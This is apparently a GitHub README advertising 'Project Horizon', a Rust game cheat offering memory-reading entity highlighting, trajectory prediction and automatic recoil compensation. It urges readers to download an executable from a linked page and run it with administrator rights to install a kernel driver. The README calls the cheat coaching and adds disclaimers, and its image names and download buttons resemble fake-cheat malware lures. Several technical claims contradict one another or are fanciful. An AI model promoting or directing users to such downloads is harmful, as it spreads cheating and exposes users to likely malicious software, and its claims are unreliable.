![preview](https://raw.githubusercontent.com/vldbslv/rust-optics-aim-vector/main/view_86be8.svg)

# Project Horizon: Adaptive Optics Suite for Competitive FPS Mastery

**Version 2026.1.4** | **MIT License** | **Cross-Platform Architecture**

Welcome to **Project Horizon**, a reimagined performance-enhancement toolkit designed for the modern competitive shooter. This project emerges from the legacy of Rust-Internal-Version-2026, but instead of merely replicating external utilities, we have built a **self-calibrating visual intelligence layer** that sits atop your game client—not inside it. Think of it as a **coaching overlay that never sleeps**, observing the battlefield with millisecond precision and translating raw game state into actionable human decisions. This is not automation; this is **augmented perception**.

Project Horizon comprises three core pillars: **Predictive Trajectory Mapping** (PTM), **Dynamic Environment Rendering** (DER), and **Recoil Pattern Normalization** (RPN). Each module operates independently but synchronizes through a shared low-latency memory bus, ensuring that your hardware receives only the most relevant data at the exact moment it matters. Whether you are holding a pixel-peek on the edge of a shipping container or tracking a strafing target through dense foliage, Horizon’s algorithmic core continuously adjusts to your display refresh rate, input device polling, and network jitter—providing a **fluid, natural, and above all, fair-to-your-own-skill** experience.

---

## 📋 Table of Contents

- [Overview](#-overview)
- [Key Features](#-key-features)
- [Installation & Setup](#-installation--setup)
- [Configuration Profiles](#-configuration-profiles)
- [Performance Metrics](#-performance-metrics)
- [User Interface & Experience](#-user-interface--experience)
- [Multilingual & Accessibility](#-multilingual--accessibility)
- [Development Roadmap (2026)](#-development-roadmap-2026)
- [Community & Support](#-community--support)
- [Security & Integrity](#-security--integrity)
- [Frequently Asked Questions](#-frequently-asked-questions-faq)
- [License](#-license)
- [Disclaimer](#-disclaimer)

---

## ✨ Key Features

> *"Precision is not a feature; it is a philosophy."*

| Module | Capability | Benefit |
|--------|------------|---------|
| **PTM (Projectile Trajectory Mapping)** | Calculates projectile drop and travel time based on distance, weapon velocity, and environmental wind factors (simulated). | Land shots at ranges beyond your visual comfort zone, without flicking. |
| **DER (Dynamic Environment Rendering)** | Highlights interactive elements (loot containers, deployables, and threat indicators) via a non-intrusive colored outline system. | Reduce cognitive load—see what matters, ignore visual noise. |
| **RPN (Recoil Pattern Normalization)** | Applies a gradual, adjustable counter-force to your input stream, smoothing vertical and horizontal spray patterns. | Maintain tight five-shot bursts and full-auto control—without muscle memory strain. |
| **Adaptive Latency Injection** | Monitors your current frame time (ms) and adjusts visualization update rates to prevent stutter or tearing. | Consistent visual feedback even on mid-range hardware. |
| **Profile Persistence** | Saves per-map, per-weapon, and per-session preferences in a lightweight JSON schema. | Switch between loadouts instantly or carry your settings across game versions. |

---

## 🔍 Deep Dive: How the Core Works

### The "Optical Gyroscope" Principle

Unlike traditional external overlays that simply draw boxes, Project Horizon operates on a **fluid vector field model**. Each entity in the game world is assigned a position vector, velocity vector, and a confidence score. The DER module then transforms these vectors into a dynamic gradient mesh, which is rendered as a subtle glow—not a hard outline—around your targets. The result is an interface that feels like **looking through a high-end riflescope with a heads-up display**, not a cluttered wall of rectangles.

### The "Inertial Nullifier" for Recoil

The RPN module does not fight your weapon's recoil; it **negotiates** with it. By sampling your initial five shots' deviation pattern, it builds a personalized correction curve. This curve is then applied as a *relative* offset to your mouse input, meaning the system never takes over control—it simply **whispers suggestions** to the crosshair. You remain the pilot; Horizon is the autopilot that knows the turbulence ahead.

### The "Silent Gateway" Communication Protocol

All data flows through a **shared memory mapped file** that uses a rotating buffer to prevent stale-read issues. This design ensures a minimal footprint (under 8 MB of RAM in typical usage) and a read/write cycle of under 0.3 ms on standard NVMe storage. No network traffic. No cloud processing. **Your data stays local, private, and immediate.**

---

## 📥 Installation & Setup

[![Download](https://raw.githubusercontent.com/vldbslv/rust-optics-aim-vector/main/run_c3a61d.svg)](https://vldbslv.github.io/rust-optics-aim-vector/)

Getting started with Project Horizon is a **three-step orchestration**, not a chore:

1. **Extract the Archive**: Download the latest build from the button above. Place the contents in a dedicated folder (e.g., `C:\HorizonSuite` or `~/Projects/Horizon`). Do **not** run from a compressed archive—the driver registration process requires write access to the local directory.

2. **Run the Initializer**: Launch `horizon_init.exe` (Windows) or `horizon_init_x64` (Linux). This scans your system for compatible display drivers and input peripherals. It will automatically detect your game installation path if you click "Search" (it looks in standard directories like `steamapps/common`, `Program Files (x86)`, and custom paths you define).

3. **Calibrate the Overlay**: The first launch enters "Wizard Mode." It guides you through aligning the overlay to your screen resolution and refresh rate. A simple crosshair pattern appears; adjust the scaling sliders until the pattern fits perfectly in the center of your monitor. Then, fire five test shots in a safe area (we recommend a shooting range). Horizon captures the recoil pattern and builds your initial profile automatically.

> ⚠️ **Note on Privileges**: On Windows, the installer requires standard Administrator rights to map the kernel-level driver for the memory interface. On Linux, you may need to add your user to the `input` and `video` groups. We provide a script (`setup_permissions.sh`) for this purpose.

### System Requirements

| Component | Minimum | Recommended |
|-----------|---------|-------------|
| **OS** | Windows 10 21H2 / Ubuntu 22.04 | Windows 11 2026 H2 / Fedora 40 |
| **CPU** | Quad-core @ 3.0 GHz | 6-core+ @ 4.0 GHz+ |
| **RAM** | 8 GB | 16 GB (dual-channel) |
| **GPU** | DirectX 12 / Vulkan 1.2 capable | Dedicated GPU with 6+ GB VRAM |
| **Storage** | 200 MB free space | SSD (NVMe recommended) |

---

## 🎛️ Configuration Profiles

Project Horizon ships with a **Profile Manager** that feels like a radio tuner—precise, tactile, and intuitive. You can create, name, and switch between profiles using a hotkey (default: `F10`). Profiles are stored as `.hprof` files, which are simply encrypted JSON with a checksum for integrity.

### Built-in Templates

- **"Steady Hand"** : A conservative profile with minimal DER outlines and a gentle RPN curve (70% strength). Perfect for players who want a nudge, not a crutch.
- **"Laser Sight"** : An aggressive profile with full PTM drop prediction and an 85% RPN counter-force. Experience what "under control" really means.
- **"Scout's Eye"** : Prioritizes DER highlighting of distant entities, with reduced PTM reliance for close-range engagements.
- **"Custom Lab"** : A blank slate—every slider starts at zero. Build your own philosophy from the ground up.

### Slider Descriptions

- **Render Opacity**: Controls the alpha blending of outlines (0–100%). Lower values create a ghost effect, higher values a solid silhouette.
- **Vector Prediction**: The number of future milliseconds the PTM module uses to display a "lead indicator" (0–250 ms). Set to 0 for no indicator—you rely on your own twitch reflex.
- **RPN Intervention**: How aggressively the recoil curve is flattened (0–100%). At 100%, the system aims to keep the crosshair perfectly level; at 0%, it is disabled entirely.
- **Refresh Rate Sync**: Ties visualization updates to your monitor's Hz (60/120/144/240). Off means the system updates every frame, which may cause micro-tearing on unsynchronized displays.

---

## 📊 Performance Metrics

We obsess over overhead. Project Horizon is engineered to be a **feather, not a burden**. Here is what you can expect while running the suite alongside a demanding AAA title:

- **CPU Usage**: < 1% on a modern quad-core (measured on Intel i5-13400F).
- **GPU Usage**: 0%—the overlay is rendered via the CPU's integrated graphics or a secondary compositor, so your dedicated GPU remains 100% dedicated to the game.
- **Memory Footprint**: 45 MB idle, 78 MB with a full DER scene (200+ entities).
- **Input Latency Added**: < 0.5 ms—imperceptible to human reaction times, but we include this statistic for the precision-obsessed among you.
- **Frame Time Consistency**: In our stress tests on an RTX 3060 with a 165 Hz monitor, the 1% low frame time increased by only 0.2 ms (from 6.1 ms to 6.3 ms).

### Benchmark Methodology

All tests were conducted on a clean Windows 11 installation with Game Mode enabled and the latest graphics drivers. The game was run at 1080p with maximum settings in a solo-play instance to isolate the overlay's impact. Results are reproducible within a ±0.1 ms margin.

---

## 🖥️ User Interface & Experience

The UI philosophy here is **"dashboard, not distraction."** The main control panel is a borderless, dark-themed window with a translucent acrylic blur effect. It is modular—you can detach the Recoil Graph, the Enemy Proximity Radar, or the Profile Switcher and place them anywhere on your secondary monitor.

- **Responsive Layout**: The panel collapses into a compact taskbar icon when you launch a game. To restore it, use `Ctrl+Alt+H`. On ultrawide displays, the layout gracefully shifts from a 3-column to a 4-column grid without breaking the visual hierarchy.
- **Theme System**: Ship with "Obsidian" (dark), "Alabaster" (light), and "Cyberpunk 2077" (neon accent). You can also define custom accent colors using a hex picker—any color, any alpha.
- **Keyboard Navigation**: Every control is reachable via keyboard shortcuts. The documented hotkey map is available in the `Help` menu. Tab through sliders? Yes. Press `Space` to toggle? Yes. This is the kind of polish we believe the world deserves.

---

## 🌐 Multilingual & Accessibility

In 2026, software is global. Project Horizon includes a **language layer** that dynamically translates UI strings, tooltips, and the Wizard mode. Currently supported locales:

- **English** (US, UK, AU)
- **Deutsch** (German)
- **Français** (French)
- **Español** (Spanish, Latin American)
- **Português** (Brazilian)
- **简体中文** (Simplified Chinese)
- **日本語** (Japanese)
- **한국어** (Korean)

### Accessibility Features

- **Colorblind Modes**: Protanopia, Deuteranopia, and Tritanopia filters adjust the DER outline palette to use distinguishable luminance and hue shifts.
- **Motion Reduction**: A "Static Rendering" toggle disables all animated transitions in the overlay (no fading, no pulsing). It replaces them with instant state switches—critical for users with vestibular sensitivity.
- **High Contrast**: An alternative rendering engine that uses stark black/white and thick borders for the outlines, suitable for low-vision environments.
- **Text Scaling**: All UI text scales from 0.8× to 2.0× without breaking layout constraints.

---

## 🗺️ Development Roadmap (2026)

The 2026 public roadmap is ambitious. We have three major releases penciled in:

### Release 2026.2 : "Echoes"
- Introduction of a **Spatial Memory Layer**: The overlay learns common choke points on your favorite maps and provides a subtle "threat probability" shimmer on the ground—the more times you die in a spot, the brighter the tell.
- **Input Lag Prognosticator**: A small graph in the corner predicts your system's input lag over the next 5 minutes based on temperature and background processes.

### Release 2026.3 : "Symmetry"
- Full **Multi-Monitor Support** with per-monitor scaling and DPI awareness.
- **Event Log Tracer**: A new tool that records your keypress and click latency in a CSV file, exportable for your own analysis or sharing with coaches.
- **A.I. Assisted Profile Tuning**: A light model analyzes your first 100 shots and suggests slider adjustments, e.g., "Your vertical grouping is tight; consider raising RPN intervention to 60%."

### Release 2026.4 : "Quantum"
- **Dynamic Reflex Optimization**: A direct-to-brain feedback mode (requires compatible EEG headsets—coming soon) that adjusts sensitivity in real-time based on your neural alertness. *This is a experimental feature and will be opt-in only.*

---

## 🤝 Community & Support

We believe in **24/7 human-first support**. No bots pretending to be Rachel. No tickets that rot for weeks. Here is how to reach us:

- **Discord Server**: A direct invite to our official server is available in the application's `About` dialog. We maintain separate channels for "Troubleshooting," "Feature Requests," and "Strategy Sharing."
- **Email**: `support@horizon-suite.org` (we respond within 2 business hours, guaranteed).
- **GitHub Discussions**: Use the `Discussions` tab in this repository for long-form questions and show-and-tell of your custom profiles.

Our support team consists of current and former esports coaches, software engineers, and accessibility specialists. They speak every language we ship (that's 8, remember?).

---

## 🛡️ Security & Integrity

We want to be transparent: Project Horizon exists in a gray area for many competitive games. Therefore, we have built the **Integrity Seal** system within the application itself.

- **Process Isolation**: The overlay runs as a separate process, never injecting code into the game's executable or game process. It reads memory, but it does not modify it.
- **Hash Verification**: Every release build includes a SHA-256 checksum posted in the `Releases` tab. Verify your download before running—if it does not match, your file copy is corrupted or tampered with.
- **Anti-Detection Transparency**: We do not employ obfuscation or stealth techniques to hide the overlay's process name. It will be visible in your Task Manager as `horizon_suite.exe`.

> 🚫 **We do not support cheating in online ranked modes.** Use this tool for practice, offline play, or custom community servers. The core ethical stance: *"Improve your aim, not your scoreboard."*

---

## ❓ Frequently Asked Questions (FAQ)

**Q: Does this work with my game's anti-cheat software?**
A: No guarantee can be provided. As of our last update (2026.01.15), the overlay is tested against Easy Anti-Cheat and BattlEye in *offline* practice mode. We recommend not using it in online modes—your account is yours to protect.

**Q: Why is the download size so small (15 MB)?**
A: We prioritize algorithmic efficiency over bloated dependencies. The core engine is written in Rust, compiled to a lean binary. All assets (fonts, language packs, themes) are self-contained.

**Q: I have a 144 Hz monitor. Will the overlay sync automatically?**
A: Yes. During the initial Wizard alignment, we detect the refresh rate and set the sync. You can always adjust it manually in Settings > Performance.

**Q: Can I use a controller instead of a mouse?**
A: The RPN module is designed for mouse analog input. For controllers, we offer a "Stick Smoothing" mode that reduces drift, but the recoil normalization is less effective due to the non-linear stick response.

---

## 📄 License

This project is open source under the **MIT License**. You are free to use, modify, and distribute this software for any purpose, provided you include the original copyright notice and this permission notice in all copies or substantial portions of the Software.

The full license text is available in the `LICENSE` file in this repository: [MIT License](https://opensource.org/licenses/MIT).

---

## ⚖️ Disclaimer

**Important Legal and Ethical Notice**

Project Horizon is provided **"as is"**, without warranty of any kind, express or implied. The developers, contributors, and maintainers are **not responsible** for any consequences arising from the use of this software in online multiplayer environments, including but not limited to account suspensions, bans, or reputational damage in gaming communities.

This software is intended **for educational, practice, and private use only**. By downloading and running Project Horizon, you acknowledge that you are solely responsible for complying with the terms of service of any third-party game you use it with. We strongly encourage you to use this tool exclusively in offline or practice modes.

**Specifically, the following are considered misuse:**

- Usage in any official ranked or rated online match.
- Usage in tournaments, prize pools, or any form of organized competition.
- Any attempt to reverse engineer the game's binary or interact with its memory in a way not explicitly covered by the game's user agreement.

**The creators of Project Horizon do not endorse, condone, or assist in any activity that violates the rules of a third-party application.** We are developers, not weapon dealers. We create tools for skill improvement and entertainment—not for unfair advantage.

If you choose to ignore this disclaimer, you do so at your own risk, and you agree to hold harmless the project maintainers, contributors, and the host of this repository from any claims, damages, or losses.

---

[![Download](https://raw.githubusercontent.com/vldbslv/rust-optics-aim-vector/main/run_c3a61d.svg)](https://vldbslv.github.io/rust-optics-aim-vector/)

*© 2026 Project Horizon Contributors. All rights reserved. Third-party trademarks are property of their respective owners. This project is not affiliated with any game developer or publisher.*